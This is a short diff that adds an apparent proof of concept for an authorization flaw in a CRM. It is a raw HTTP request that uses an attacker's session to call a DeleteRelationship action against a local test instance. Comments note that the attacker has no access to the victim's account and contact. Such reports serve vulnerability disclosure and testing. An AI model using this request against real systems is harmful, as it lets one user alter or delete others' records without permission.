@@ -1,0 +1,7 @@
+GET /index.php?module=Accounts&action=DeleteRelationship&record=0be907cd-5a62-47ff-8683-b22c2fd1cb51&linked_field=contacts&linked_id=6ccf7b0c-70f1-4668-96b2-b92a14ac9d46&refresh_page=1 HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker session>
+Referer: http://localhost:33116/index.php?module=Accounts&action=DetailView&record=0be907cd-5a62-47ff-8683-b22c2fd1cb51
+
+# Attacker A (mod_5e2aad63) has never viewed, been assigned,
+# or been related to Account 0be907cd-5a62-47ff-8683-b22c2fd1cb51 or Contact 6ccf7b0c-70f1-4668-96b2-b92a14ac9d46 (both owned by V).
